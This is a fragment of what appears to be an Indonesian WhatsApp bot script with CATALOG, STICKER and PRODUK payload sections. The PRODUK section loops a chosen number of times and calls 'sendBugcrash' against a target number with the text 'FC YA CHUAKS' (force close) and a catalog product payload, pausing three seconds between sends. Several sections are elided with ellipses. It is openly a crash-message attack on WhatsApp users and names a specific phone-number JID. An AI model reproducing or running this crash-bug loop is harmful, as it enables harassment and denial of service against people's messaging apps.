CATALOG :
{
    ...
    "businessOwnerJid": "6285697175057@s.whatsapp.net",
    }
    ...
    STICKER : 
    {
        ...
        await sleep(ms(waktu))
         ...
         PRODUK :
         {
            ...
            waktu = '3s'
            for (let i = 0; i < jumlah; i++) {
            sendBugcrash(num, 'FC YA CHUAKS', ppnyauser, "6285697175057@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
            await sleep(ms(waktu))
            }
            }
